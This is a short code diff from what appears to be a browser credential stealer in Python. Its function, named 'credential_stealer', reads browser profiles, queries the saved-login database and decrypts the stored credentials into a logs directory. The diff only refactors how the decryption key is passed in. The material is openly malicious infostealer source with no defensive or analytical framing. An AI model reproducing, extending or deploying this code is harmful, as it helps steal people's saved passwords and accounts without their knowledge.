@@ -1,14 +1,10 @@
 """ IMPORTS """
 import json
 import sqlite3
-import pywintypes
-from util import (
-    get_profiles, create_temp_file, create_log_file,
-    get_encryption_key, try_decrypt,
-)
+from util import get_profiles, create_temp_file, create_log_file, try_decrypt
 
 
-def credential_stealer(browser: dict) -> None:
+def credential_stealer(browser: dict, encryption_key: str) -> None:
     """ Steals credentials from a browser and places them into the logs directory """
     # Examine each profile
     profile_names = get_profiles(browser['path'])
@@ -25,7 +21,6 @@ def credential_stealer(browser: dict) -> None:
         data = cursor.fetchall()
 
         # Decrypt credentials
-        encryption_key = get_encryption_key(browser['path'])
         credentials = [
             {
                 'url': try_decrypt(url, encryption_key),
